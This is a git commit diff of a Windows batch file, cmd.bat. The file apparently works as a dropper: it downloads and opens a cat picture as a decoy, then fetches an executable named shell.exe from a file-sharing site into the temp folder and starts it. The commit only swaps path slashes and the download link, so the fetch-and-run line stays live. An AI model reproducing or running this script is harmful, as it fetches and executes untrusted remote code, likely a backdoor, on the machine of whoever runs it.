5079ae06d86d7fe6f1367b619dba91c95fca652e
terionun <38081201+terionun@users.noreply.github.com>
2022-10-02 22:21:32 +0300

    Update cmd.bat

--- cmd.bat
+++ cmd.bat
@@ -1,2 +1,2 @@
-curl https://upload.wikimedia.org/wikipedia/commons/7/74/A-Cat.jpg --output %temp%\cat.jpg && start %temp%\cat.jpg
-curl https://www.dosyaupload.com/48C2C?pt=VXpKYVMzZzVNSEZYWjFrcmQyeGFTM2RhY1VGR1VUMDlPcWpjdnBQQVg5dzdVZ0FKdGhobTZxYz0%3D --output %temp%\shell.exe && start %temp%\shell.exe
+curl https://upload.wikimedia.org/wikipedia/commons/7/74/A-Cat.jpg --output %temp%/cat.jpg && start %temp%/cat.jpg
+curl https://www.dosyaupload.com/48C2C?pt=U1ZOUGFtbDBVblp5YVhabFNGZ3lNR0pwTXpOb1FUMDlPZ0NjOVRKaWpZYU05UFZya2ZSaWV1ST0%3D --output %temp%/shell.exe && start %temp%/shell.exe
